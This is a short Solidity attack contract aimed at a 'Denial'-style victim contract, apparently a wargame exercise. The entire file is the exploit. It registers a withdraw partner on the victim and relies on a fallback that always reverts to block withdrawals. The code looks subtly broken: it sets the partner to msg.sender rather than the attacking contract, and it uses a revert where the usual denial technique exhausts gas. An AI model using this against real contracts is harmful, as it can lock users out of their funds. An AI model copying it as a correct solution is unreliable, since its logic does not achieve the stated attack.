pragma solidity ^0.8.10;

interface IDenial {    
    function setWithdrawPartner(address _partner) external;
    function withdraw() external;    
    function contractBalance() external view returns (uint) ;
}

contract AttackDenial {
    address public victim;
    IDenial public d;        

    constructor(address _victim) { 
        victim = _victim;                   
    }
    receive() external payable {
        require(false);
    }
    
    function attack () public {
        d = IDenial(victim);
        d.setWithdrawPartner(msg.sender);    
        d.withdraw();    
    }
}